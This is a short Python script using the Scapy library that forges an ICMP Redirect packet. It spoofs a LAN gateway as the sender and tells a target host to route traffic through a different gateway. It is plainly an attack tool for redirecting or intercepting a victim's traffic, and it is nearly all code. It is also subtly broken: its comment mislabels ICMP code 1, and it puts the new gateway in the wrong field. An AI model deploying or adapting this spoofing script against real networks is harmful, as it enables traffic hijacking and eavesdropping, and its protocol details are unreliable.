from scapy.all import IP, ICMP, send
# Written by Lithiokride

# Set up parameters
gateway_ip = "192.168.1.1"  # IP of the gateway sending the redirect
target_ip = "192.168.1.100"  # Original destination IP
new_gateway_ip = "192.168.1.254"  # New suggested gateway IP

# Create the IP layer for the redirect
ip = IP(src=gateway_ip, dst=target_ip)

# Create the ICMP Redirect message
icmp = ICMP(type=5, code=1)  # Type 5 is Redirect, code 1 is for "Redirect Datagram for the Network"

# Include the new gateway IP in the payload
payload = IP(dst=target_ip, src=new_gateway_ip)

# Create and send the packet
packet = ip/icmp/payload
send(packet, verbose=0)

print(f"Sent ICMP Redirect packet from {gateway_ip} to {target_ip}, suggesting new gateway {new_gateway_ip}")
